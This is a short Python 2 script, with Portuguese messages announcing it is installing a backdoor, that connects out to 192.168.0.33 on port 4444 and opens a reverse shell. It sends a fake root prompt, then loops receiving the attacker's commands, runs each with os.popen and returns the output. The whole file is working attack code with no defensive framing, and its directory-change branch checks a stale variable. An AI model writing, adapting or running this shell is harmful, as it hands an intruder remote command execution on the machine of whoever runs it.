import sys
import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Instalando backdoor\n")
print("Conexao aberta com >DE`DSEC")

s.connect(("192.168.0.33", 4444))
s.send(" ____________________________\n")
s.send("|                            |\n")
s.send("|Conexao com >DE`DSEC aberta!|\n")
s.send("|____________________________|\n")
s.send("\n")
data = s.recv(1024)
s.send("root@>DE`DSEC#")
while True:
    cmd_atacante = s.recv(1024)
    exec_atacante = os.popen(cmd_atacante)
    s.send(exec_atacante.read())

    if data.startswith("cd"):
        os.chdir(data[3:].replace("\n", ''))
        s.send("Movendo para " + str(os.getcwd()))
        result = "\n"
    else:
        result = os.popen(data).read()